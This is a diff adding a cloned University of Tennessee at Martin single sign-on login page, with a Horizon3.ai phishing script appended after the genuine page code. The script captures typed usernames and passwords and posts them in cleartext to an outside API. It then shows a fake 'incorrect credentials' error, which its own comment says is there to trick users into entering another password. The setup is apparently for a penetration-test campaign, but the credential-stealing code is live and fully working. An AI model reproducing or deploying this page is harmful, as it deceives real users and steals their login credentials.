@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <base
+        href="https://cas.utm.edu/authenticationendpoint/login.do&amp;relyingParty=AWS-Portal&amp;type=cas&amp;sp=AWS-Portal&amp;isSaaSApp=false&amp;authenticators=BasicAuthenticator%3ALOCAL" />
+    <!-- header --><!-- localize.jsp MUST already be included in the calling script -->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link href="libs/theme/assets/images/favicon.ico" rel="icon" type="image/x-icon" />
+    <link href="libs/theme/wso2-default.min.css" rel="stylesheet" />
+    <title>WSO2 Identity Server</title>
+    <style type="text/css">
+        html,
+        body {
+            height: 100%;
+        }
+
+        body {
+            flex-direction: column;
+            display: flex;
+        }
+
+        main {
+            flex-shrink: 0;
+        }
+
+        main.center-segment {
+            margin: auto;
+            display: flex;
+            align-items: center;
+        }
+
+        main.center-segment>.ui.container.medium {
+            max-width: 450px !important;
+        }
+
+        main.center-segment>.ui.container.large {
+            max-width: 700px !important;
+        }
+
+        main.center-segment>.ui.container>.ui.segment {
+            padding: 3rem;
+        }
+
+        main.center-segment>.ui.container>.ui.segment .segment-form .buttons {
+            margin-top: 1em;
+        }
+
+        main.center-segment>.ui.container>.ui.segment .segment-form .buttons.align-right button,
+        main.center-segment>.ui.container>.ui.segment .segment-form .buttons.align-right input {
+            margin: 0 0 0 0.25em;
+        }
+
+        main.center-segment>.ui.container>.ui.segment .segment-form .column .buttons.align-left button.link-button,
+        main.center-segment>.ui.container>.ui.segment .segment-form .column .buttons.align-left input.link-button {
+            padding: .78571429em 1.5em .78571429em 0;
+        }
+
+        main.center-segment>.ui.container>.ui.segment .segment-form {
+            text-align: left;
+        }
+
+        main.center-segment>.ui.container>.ui.segment .segment-form .align-center {
+            text-align: center;
+        }
+
+        main.center-segment>.ui.container>.ui.segment .segment-form .align-right {
+            text-align: right;
+        }
+
+        .cookie-policy-message {
+            font-size: 14px;
+        }
+
+        footer {
+            padding: 2rem 0;
+        }
+
+        body .product-title .product-title-text {
+            margin: 0;
+        }
+
+        body .center-segment .product-title .product-title-text {
+            margin-top: 2em;
+            margin-bottom: 1em;
+        }
+
+        .ui.menu.fixed.app-header .product-logo {
+            padding-left: 0;
+        }
+
+        /* Table of content styling */
+
+        main #toc {
+            position: sticky;
+            top: 93px;
+        }
+
+        main .ui.segment.toc {
+            padding: 20px;
+        }
+
+        main .ui.segment.toc ul.ui.list.nav>li.sub {
+            margin-left: 20px;
+        }
+
+        main .ui.segment.toc ul.ui.list.nav>li>a {
+            color: rgba(0, 0, 0, .87);
+            text-decoration: none;
+        }
+
+        main .ui.segment.toc ul.ui.list.nav>li:before {
+            content: "\2219";
+            font-weight: bold;
+            font-size: 1.6em;
+            line-height: 0.5em;
+            display: inline-block;
+            width: 1em;
+            margin-left: -0.7em;
+        }
+
+        main .ui.segment.toc ul.ui.list.nav>li.sub:before {
+            content: "\2192";
+            margin-left: -1em;
+        }
+
+        main .ui.segment.toc ul.ui.list.nav>li:hover a {
+            color: #ff5000;
+            text-decoration: none;
+        }
+
+        main .ui.segment.toc ul.ui.list.nav>li:hover:before {
+            color: #ff5000;
+        }
+    </style>
+    <script src="libs/jquery_3.6.0/jquery-3.6.0.js"></script>
+    <link href="css/utmcustomized.css" rel="stylesheet" />
+    <script src="https://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js" async=""></script>
+    <script>
+        WebFontConfig = {
+            google: {
+                families: ['Montserrat:300,400,600,700,800', 'Zilla Slab:400,800']
+            },
+            custom: {
+                families: ['Asphalts Brush', 'Asphalts Display (Personal Use)'],
+                urls: ['../css/stylesheet.fonts.css']
+            }
+        };
+
+        (function (d) {
+            var wf = d.createElement('script'),
+                s = d.scripts[0];
+            wf.src = 'https://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
+            wf.async = true;
+            s.parentNode.insertBefore(wf, s);
+
+        })(document);
+    </script>
+</head>
+
+<body onload="checkSessionKey()">
+    <main class="center-segment">
+        <div class="ui container medium center aligned middle aligned">
+            <!-- product-title --><!--jsp:include page="extensions/product-title.jsp"/--><!--jsp:directive.include file="includes/product-title.jsp"/-->
+            <div class="ui segment"><!--h3 class="ui header text-right-baseline">
+                    
+                        Sign In
+                    
+                </h3-->
+                <div class="segment-form text-right-baseline">
+                    <script>
+                        function goBack() {
+                            window.history.back();
+                        }
+
+                        // Handle form submission preventing double submission.
+                        $(document).ready(function () {
+                            $.fn.preventDoubleSubmission = function () {
+                                $(this).on('submit', function (e) {
+                                    var $form = $(this);
+                                    if ($form.data('submitted') === true) {
+                                        // Previously submitted - don't submit again.
+                                        e.preventDefault();
+                                        console.warn("Prevented a possible double submit event");
+                                    } else {
+                                        e.preventDefault();
+
+                                        var isEmailUsernameEnabled = JSON.parse("false");
+                                        var tenantName = getParameterByName("tenantDomain");
+                                        var userName = document.getElementById("username");
+                                        var usernameUserInput = document.getElementById("usernameUserInput");
+
+                                        if (usernameUserInput) {
+                                            var usernameUserInputValue = usernameUserInput.value.trim();
+
+                                            if (tenantName && tenantName !== "null") {
+
+                                                if (isEmailUsernameEnabled) {
+
+                                                    if (usernameUserInputValue.split("@").length <= 1) {
+                                                        var errorMessage = document.getElementById("error-msg");
+
+                                                        errorMessage.innerHTML = "Invalid Username. Username has to be an email address.";
+                                                        errorMessage.style.display = "block";
+
+                                                        return;
+                                                    }
+
+                                                    if (usernameUserInputValue.split("@").length === 2) {
+                                                        userName.value = usernameUserInputValue + "@" + tenantName;
+                                                    }
+                                                    else {
+                                                        userName.value = usernameUserInputValue;
+                                                    }
+                                                } else {
+                                                    if (usernameUserInputValue.split("@").length > 1) {
+                                                        userName.value = usernameUserInputValue;
+                                                    } else {
+                                                        userName.value = usernameUserInputValue + "@" + tenantName;
+                                                    }
+
+                                                }
+
+                                            } else {
+                                                userName.value = usernameUserInputValue;
+                                            }
+                                        }
+
+                                        if (userName.value) {
+                                            let contextPath = ""
+                                            if (contextPath !== "") {
+                                                contextPath = contextPath.startsWith('/') ? contextPath : "/" + contextPath
+                                                contextPath = contextPath.endsWith('/') ?
+                                                    contextPath.substring(0, contextPath.length - 1) : contextPath
+                                            }
+                                            $.ajax({
+                                                type: "GET",
+                                                url: contextPath + "/logincontext?sessionDataKey=" + getParameterByName("sessionDataKey") +
+                                                    "&relyingParty=" + getParameterByName("relyingParty") + "&tenantDomain=" + tenantName,
+                                                success: function (data) {
+                                                    if (data && data.status == 'redirect' && data.redirectUrl && data.redirectUrl.length > 0) {
+                                                        window.location.href = data.redirectUrl;
+                                                    } else if ($form.data('submitted') !== true) {
+                                                        $form.data('submitted', true);
+                                                        document.getElementById("loginForm").submit();
+                                                    } else {
+                                                        console.warn("Prevented a possible double submit event.");
+                                                    }
+                                                },
+                                                cache: false
+                                            });
+                                        }
+                                    }
+                                });
+
+                                return this;
+                            };
+                            $('#loginForm').preventDoubleSubmission();
+                        });
+                    </script><!--script src="https://code.jquery.com/jquery-3.4.1.min.js"></script-->
+                    <script>
+                        function noemail() {
+                            /*        var uname = $("#username").val();
+                            
+                                    var m = uname.indexOf("@utm.edu");
+                                    var n = uname.indexOf("@ut.utm.edu");
+                                    var q = uname.indexOf("@ut");
+                            
+                                    $("#m-span").html(m);
+                                    $("#n-span").html(n);
+                                    $("#q-span").html(q);
+                            
+                                    if (m > -1 || n > -1) {
+                                            var p = $("#username").val().substring(0,q);
+                                            $("#username").val(p);
+                                            //$("#found").html(p);
+                                    alert("Replaced");
+                                    }
+                            */
+                            var uname = document.getElementById('usernameUserInput').value;
+                            var m = uname.indexOf("@utm.edu");
+                            var n = uname.indexOf("@ut.utm.edu");
+                            var q = uname.indexOf("@ut");
+
+                            if (m > -1 || n > -1) {
+                                var p = document.getElementById("usernameUserInput").value.substring(0, q);
+                                document.getElementById("usernameUserInput").value = p;
+                            }
+                        }
+                    </script>
+                    <form action="" class="ui large form" id="loginForm" method="post"><input
+                            value="https://cas.utm.edu"
+                            type="hidden" />
+                        <div class="ui visible negative message" id="error-msg" style="display: none;"> </div>
+
+                        <center><img height="80px" src="https://www.utm.edu/_imgs/UT-Martin-simple-logo.svg" /></center>
+
+                        <div class="field">
+                            <div class="ui fluid left icon input"><input
+                                    class="text-right-baseline utm-form-input-label  utm-form-input-user utm-box-gray"
+                                    id="usernameUserInput" value="" onkeyup="noemail()" placeholder="Username"
+                                    required="" tabindex="1" type="text" /> <input id="username" value="null"
+                                    type="hidden" /></div>
+                        </div>
+
+                        <div class="field">
+                            <div class="ui fluid left icon input"><input autocomplete="off"
+                                    class="text-right-baseline utm-form-input-label utm-form-input-password utm-box-gray"
+                                    id="password" value="" placeholder="Password" tabindex="2" type="password" /></div>
+                        </div>
+
+                        <div style="float:right">Forgotten your password? Reset it <a
+                                href="https://ds.tennessee.edu/passwords/reset.asp">here</a>.</div>
+                         
+
+                        <div style="float:right"><b>ALUMNI:</b> Reset your password <a
+                                href="https://www.utm.edu/forgotpassword.php">here</a>.</div>
+                         
+
+                        <div style="float:right">For password assistance,<br />
+                            contact the Helpdesk at (731) 881-7900.</div>
+
+                        <div class="margin-bottom-3" role="alert">
+                            <div><br />
+                                <br />
+                                <br />
+                                <br />
+                                By signing in, you agree to the terms of the <a
+                                    href="https://policy.tennessee.edu/policy/it0110-acceptable-use-of-information-technology-resources/">UT
+                                    Acceptable Use Policy</a>.
+                            </div>
+                        </div>
+                        <!--div class="buttons">
+        
+        <div class="field">
+            Forgot
+            
+                <a id="usernameRecoverLink" tabindex="5" href="https://cas.utm.edu/accountrecoveryendpoint/recoveraccountrouter.do?Name=PreLoginRequestProcessor&commonAuthCallerPath=%252Fcas%252Flogin&forceAuth=true&passiveAuth=false&service=https%3A%2F%2Fportal.utm.edu%2F&tenantDomain=carbon.super&sessionDataKey=7baf940e-33e2-4c54-8040-82eaceceae49&relyingParty=AWS-Portal&type=cas&sp=AWS-Portal&isSaaSApp=false&authenticators=BasicAuthenticator%3ALOCAL&isUsernameRecovery=true&callback=https%3A%2F%2Fcas.utm.edu%3A443%2Fauthenticationendpoint%2Flogin.do%3FName%3DPreLoginRequestProcessor%26commonAuthCallerPath%3D%252Fcas%252Flogin%26forceAuth%3Dtrue%26passiveAuth%3Dfalse%26service%3Dhttps%3A%2F%2Fportal.utm.edu%2F%26tenantDomain%3Dcarbon.super%26sessionDataKey%3D7baf940e-33e2-4c54-8040-82eaceceae49%26relyingParty%3DAWS-Portal%26type%3Dcas%26sp%3DAWS-Portal%26isSaaSApp%3Dfalse%26authenticators%3DBasicAuthenticator%3ALOCAL">
+                    Username
+                </a>
+                or
+            
+            <a id="passwordRecoverLink" tabindex="6" href="https://cas.utm.edu/accountrecoveryendpoint/recoveraccountrouter.do?Name=PreLoginRequestProcessor&commonAuthCallerPath=%252Fcas%252Flogin&forceAuth=true&passiveAuth=false&service=https%3A%2F%2Fportal.utm.edu%2F&tenantDomain=carbon.super&sessionDataKey=7baf940e-33e2-4c54-8040-82eaceceae49&relyingParty=AWS-Portal&type=cas&sp=AWS-Portal&isSaaSApp=false&authenticators=BasicAuthenticator%3ALOCAL&isUsernameRecovery=false&callback=https%3A%2F%2Fcas.utm.edu%3A443%2Fauthenticationendpoint%2Flogin.do%3FName%3DPreLoginRequestProcessor%26commonAuthCallerPath%3D%252Fcas%252Flogin%26forceAuth%3Dtrue%26passiveAuth%3Dfalse%26service%3Dhttps%3A%2F%2Fportal.utm.edu%2F%26tenantDomain%3Dcarbon.super%26sessionDataKey%3D7baf940e-33e2-4c54-8040-82eaceceae49%26relyingParty%3DAWS-Portal%26type%3Dcas%26sp%3DAWS-Portal%26isSaaSApp%3Dfalse%26authenticators%3DBasicAuthenticator%3ALOCAL">
+                Password
+            </a>
+            ?
+        </div>
+        
+
+        
+    </div-->
+
+                        <div class="ui divider hidden"> </div>
+
+                        <div class="field">
+                            <div class="ui checkbox"><!--div class="ui checkbox">
+            <input tabindex="3" type="checkbox" id="chkRemember" name="chkRemember">
+            <label>Remember me on this computer</label>
+        </div--></div>
+                            <input value="7baf940e-33e2-4c54-8040-82eaceceae49" type="hidden" />
+                            <div class="ui divider hidden"> </div>
+                            <!--div class="cookie-policy-message">
+        After a successful sign in, we use a cookie in your browser to track your session. You can refer our
+        <a href="cookie_policy.do" target="policy-pane">
+            Cookie Policy
+        </a>
+        for more details.
+        <br><br>
+        By signing in, you agree to our
+        <a href="privacy_policy.do" target="policy-pane">
+            Privacy Policy
+        </a>
+    </div-->
+
+                            <div class="ui divider hidden"> </div>
+
+                            <div class="ui two column stackable grid">
+                                <div
+                                    class="column mobile center aligned tablet left aligned computer left aligned buttons tablet no-padding-left-first-child computer no-padding-left-first-child"><!--button
+                type="button"
+                onclick="window.location.href='https://cas.utm.edu/accountrecoveryendpoint/register.do?Name=PreLoginRequestProcessor&commonAuthCallerPath=%252Fcas%252Flogin&forceAuth=true&passiveAuth=false&service=https%3A%2F%2Fportal.utm.edu%2F&tenantDomain=carbon.super&sessionDataKey=7baf940e-33e2-4c54-8040-82eaceceae49&relyingParty=AWS-Portal&type=cas&sp=AWS-Portal&isSaaSApp=false&authenticators=BasicAuthenticator%3ALOCAL&callback=https%3A%2F%2Fcas.utm.edu%3A443%2Fauthenticationendpoint%2Flogin.do%3FName%3DPreLoginRequestProcessor%26commonAuthCallerPath%3D%252Fcas%252Flogin%26forceAuth%3Dtrue%26passiveAuth%3Dfalse%26service%3Dhttps%3A%2F%2Fportal.utm.edu%2F%26tenantDomain%3Dcarbon.super%26sessionDataKey%3D7baf940e-33e2-4c54-8040-82eaceceae49%26relyingParty%3DAWS-Portal%26type%3Dcas%26sp%3DAWS-Portal%26isSaaSApp%3Dfalse%26authenticators%3DBasicAuthenticator%3ALOCAL';"
+                class="ui large button link-button"
+                id="registerLink"
+                tabindex="8"
+                role="button">
+                    create.account
+            </button--></div>
+
+                                <div
+                                    class="column mobile center aligned tablet right aligned computer right aligned buttons tablet no-margin-right-last-child computer no-margin-right-last-child">
+                                    <button class="ui primary large button utm-blue-bg" role="button" tabindex="4"
+                                        type="submit">SIGN IN</button></div>
+                            </div>
+
+                            <div><br />
+                                <br />
+                                 
+                                <center>Need assistance? <a href="https://www.utm.edu/faq.php">Get help signing
+                                        in</a>.<br />
+                                    <br />
+                                    <a href="https://2fa.utk.edu/">Sign up</a> for two-factor authentication<br />
+                                    with <a href="https://2fa.utk.edu/"> <img height="25px"
+                                            src="https://duo.com/assets/img/duoLogo-web.png" style="margin-left:4px;" />
+                                    </a>
+                                </center>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+            </div>
+            <!-- product-footer --><!-- localize.jsp MUST already be included in the calling script --><!-- footer -->
+
+            <footer class="footer" style="text-align: center">
+                <div class="container-fluid">
+                    <p>WSO2 Identity Server ©
+                        <script>document.write(new Date().getFullYear());</script>
+                    </p>
+                </div>
+            </footer>
+            <!-- footer -->
+            <script src="libs/theme/semantic.min.js"></script>
+            <script>
+                function checkSessionKey() {
+                    var proxyPath = ""
+                    $.ajax({
+                        type: "GET",
+                        url: proxyPath + "/logincontext?sessionDataKey=" + getParameterByName("sessionDataKey") +
+                            "&relyingParty=" + getParameterByName("relyingParty") + "&tenantDomain="
+                            + getParameterByName("tenantDomain"),
+                        success: function (data) {
+                            if (data && data.status == 'redirect' && data.redirectUrl && data.redirectUrl.length > 0) {
+                                window.location.href = data.redirectUrl;
+                            }
+                        },
+                        cache: false
+                    });
+                }
+
+                function getParameterByName(name, url) {
+                    if (!url) {
+                        url = window.location.href;
+                    }
+                    name = name.replace(/[\[\]]/g, '\$&');
+                    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+                        results = regex.exec(url);
+                    if (!results) return null;
+                    if (!results[2]) return "";
+                    return decodeURIComponent(results[2].replace(/\+/g, ' '));
+                }
+
+                $(document).ready(function () {
+                    $('.main-link').click(function () {
+                        $('.main-link').next().hide();
+                        $(this).next().toggle('fast');
+                        var w = $(document).width();
+                        var h = $(document).height();
+                        $('.overlay').css("width", w + "px").css("height", h + "px").show();
+                    });
+
+                    $('.overlay').click(function () {
+                        $(this).hide();
+                        $('.main-link').next().hide();
+                    });
+
+
+                });
+
+                function myFunction(key, value, name) {
+                    var object = document.getElementById(name);
+                    var domain = object.value;
+
+
+                    if (domain != "") {
+                        document.location = "../commonauth?idp=" + key + "&authenticator=" + value +
+                            "&sessionDataKey=7" +
+                            domain;
+                    } else {
+                        document.location = "../commonauth?idp=" + key + "&authenticator=" + value +
+                            "&sessionDataKey=7";
+                    }
+                }
+
+                function handleNoDomain(elem, key, value) {
+                    var linkClicked = "link-clicked";
+                    if ($(elem).hasClass(linkClicked)) {
+                        console.warn("Preventing multi click.")
+                    } else {
+                        $(elem).addClass(linkClicked);
+
+                        document.location = "../commonauth?idp=" + key + "&authenticator=" + value +
+                            "&sessionDataKey=7" +
+                            "";
+                    }
+                }
+
+                window.onunload = function () { };
+
+                function changeUsername(e) {
+                    document.getElementById("changeUserForm").submit();
+                }
+
+                $('.isHubIdpPopupButton').popup({
+                    popup: '.isHubIdpPopup',
+                    on: 'click',
+                    position: 'top left',
+                    delay: {
+                        show: 300,
+                        hide: 800
+                    }
+                });
+            </script>
+        </div>
+    </main>
+    
+<script>
+    // Horizon3.ai Phishing JavaScript Embed Code
+    // Update the following variables to true or false based on your needs
+    const testModeEnabled = false // Set to false to hide test banner
+    const showIncorrectCredentialsError = true // Set to false if you do not want "Incorrect Login Credentials. Enter your sign in information again." to appear after a user submits their password. This is used to trick the user into trying another password variation
+
+    const pentestId = 'PENTEST_ID'
+    const phisherKey = 'PHISHER_KEY'
+    const lowercaseUsernameTerms = ['email', 'username', 'uname', 'user']
+    const lowercasePasswordTerms = ['password']
+    const lowercaseSubmitTerms = ['submit', 'sign in', 'log in']
+    const credentials = {
+        username: '',
+        password: '',
+    }
+    let token = ''
+
+    if (!token) {
+        fetch('https://api.horizon3ai.com/v1/auth', {
+            method: 'POST',
+            headers: { 'content-type': 'application/json' },
+            body: JSON.stringify({ key: phisherKey }),
+        })
+            .then(response => response.json())
+            .then(response => (token = response.token))
+            .catch(err => console.log(err))
+    }
+
+    const inputs = document.querySelectorAll('input')
+    const buttons = document.querySelectorAll('button')
+    const body = document.querySelector('body')
+    const formValidationError = document.createElement('p')
+    const testBanner = document.createElement('div')
+    const testCredentials = document.createElement('div')
+    const generateCredentialText = () =>
+        'Credentials username=' + credentials.username + ' password=' + credentials.password
+
+    testBanner.style =
+        'position: absolute; top: 0; left: 0; width: 100%; opacity: 0.9; z-index:9999; padding: 30px; background: #9E0325; color: white; font-size: 16px; font-weight: bold; text-align: center;'
+    testBanner.textContent =
+        'Horizon3.ai phishing test mode enabled. Disable test mode in the javascript before beginning your phishing campaign.'
+    testCredentials.style = 'color: white; font-size: 16px; margin: 5px 0 5px 0;'
+    testCredentials.textContent = generateCredentialText()
+    formValidationError.style = 'color: #9E0325; font-size: 14px;'
+    formValidationError.textContent = 'Incorrect Login Credentials. Enter your sign in information again.'
+
+    const usernameHandler = e => {
+        credentials.username = e.target.value
+        if (testModeEnabled) {
+            testCredentials.textContent = generateCredentialText()
+        }
+    }
+
+    const passwordHandler = e => {
+        credentials.password = e.target.value
+        if (testModeEnabled) {
+            testCredentials.textContent = generateCredentialText()
+        }
+    }
+    const submitHandler = e => {
+        e.preventDefault()
+
+        fetch('https://api.horizon3ai.com/v1/graphql', {
+            headers: { 'content-type': 'application/json', 'Authorization': token },
+            method: 'POST',
+            body: JSON.stringify({
+                query: 'mutation inject_phish { inject_phish(op_id: "' + pentestId + '", potential_credentials: [{ key_type:"cleartext", user: "' + credentials.username + '", cleartext: "' + credentials.password + '" }], is_test_mode: ' + testModeEnabled + ') { message }}'
+            }),
+        })
+            .then(response => response.json())
+            .then(json => {
+                if (testModeEnabled && credentials.username && credentials.password && json.data.inject_phish.message === 'Test succeeded.') {
+                    testBanner.style =
+                        'position: absolute; top: 0; left: 0; width: 100%; opacity: 0.9; z-index:9999; padding: 30px; background: green; color: white; font-size: 16px; font-weight: bold; text-align: center;'
+                    const testSuccessful = document.createElement('div')
+                    testSuccessful.textContent = 'Credentials successfully captured. Disable test mode when ready to begin phishing campaign.'
+                    testBanner.appendChild(testSuccessful)
+                } else if (testModeEnabled && !credentials.username || !credentials.password) {
+                    const testFailed = document.createElement('div')
+                    testFailed.textContent = 'Error capturing credentials. Troubleshoot the inputs for username, password and submit on the login page or contact support.'
+                    testBanner.appendChild(testFailed)
+                }
+            })
+            .catch(err => console.log(err))
+
+        if (showIncorrectCredentialsError) {
+            const submitButton = document.querySelector('.h3-submit')
+            submitButton.parentNode.insertBefore(formValidationError, submitButton)
+        }
+    }
+
+    const eventhandlers = {
+        username: usernameHandler,
+        password: passwordHandler,
+        submit: submitHandler,
+    }
+
+    inputs.forEach(input => {
+        const attributeNames = input.getAttributeNames()
+        const attributeValues = attributeNames.map(name => input.getAttribute(name).toLowerCase())
+        const isUsername = lowercaseUsernameTerms.some(term => attributeValues.join('|').includes(term))
+        const isPassword = lowercasePasswordTerms.some(term => attributeValues.join('|').includes(term))
+        const isSubmit = lowercaseSubmitTerms.some(term => attributeValues.join('|').includes(term))
+        const eventHandler = isUsername
+            ? eventhandlers.username
+            : isPassword
+                ? eventhandlers.password
+                : isSubmit
+                    ? eventhandlers.submit
+                    : undefined
+
+        if (eventHandler) {
+            input.addEventListener('input', eventHandler)
+
+            if (isSubmit) {
+                input.classList.add('h3-submit')
+            }
+        }
+    })
+
+    buttons.forEach(button => {
+        const attributeNames = button.getAttributeNames()
+        const attributeValues = attributeNames.map(name => button.getAttribute(name).toLowerCase())
+        const isSubmit = lowercaseSubmitTerms.some(term => attributeValues.join('|').includes(term))
+
+        if (isSubmit) {
+            button.classList.add('h3-submit')
+        }
+    })
+
+    if (testModeEnabled) {
+        body.appendChild(testBanner)
+        testBanner.appendChild(testCredentials)
+    }
+
+    window.addEventListener('submit', submitHandler)
+</script>
+
+</body>
+
+</html>
